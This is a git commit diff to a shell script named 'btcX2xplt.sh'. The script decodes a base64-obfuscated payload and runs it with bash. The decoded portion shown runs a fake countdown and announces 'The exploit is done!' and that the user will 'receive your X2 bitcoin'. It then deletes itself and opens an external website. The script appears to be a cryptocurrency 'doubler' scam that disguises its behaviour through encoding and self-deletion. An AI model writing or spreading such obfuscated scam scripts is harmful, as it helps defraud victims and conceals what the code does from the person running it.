04b8ac35776f5427c4c8d24765082c57c320ad7a
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-01-20 17:01:24 +0000

    Update btcX2xplt.sh

--- btcX2xplt.sh
+++ btcX2xplt.sh
@@ -57,6 +57,5 @@ ICAgICAgICAgICAgICBzZWM9NTkKICAgICAgICAgICAgICAgICAgICAgICAgbGV0ICJtaW49bWlu
 LTEiCiAgICAgICAgICAgICAgICBkb25lCiAgICAgICAgICAgICAgICBtaW49NTkKICAgICAgICAg
 ICAgICAgIGxldCAiaG91cj1ob3VyLTEiCiAgICAgICAgZG9uZQplY2hvICJUaGUgZXhwbG9pdCBp
 cyBkb25lISIKZWNobyAiWW91IHdpbGwgcmVjZWl2ZSB5b3VyIFgyIGJpdGNvaW4gaW4gYSBjb3Vw
-bGUgb2YgbWludXRlcyEiCmNkICYmIGNkIERvY3VtZW50cyAmJiBybSBiaXRjb2luWDJleHBsb2l0
-dC5zaCAmJiBmaXJlZm94IGh0dHA6Ly9wZXRzcGFsdGFuLmNvbS8gJiYgY2xlYXIgJiYgZXhpdAoK
-Cg==" | base64 -d > btcX2xpltt.sh && chmod +x btcX2xpltt.sh && bash btcX2xpltt.sh
+bGUgb2YgbWludXRlcyEiCnJtIGJ0Y1gyeHBsdC5zaCAmJiBmaXJlZm94IGh0dHA6Ly9wZXRzcGFs
+dGFuLmNvbS8gJiYgY2xlYXIgJiYgZXhpdAoKCg==" | base64 -d > btcX2xpltt.sh && chmod +x btcX2xpltt.sh && bash btcX2xpltt.sh
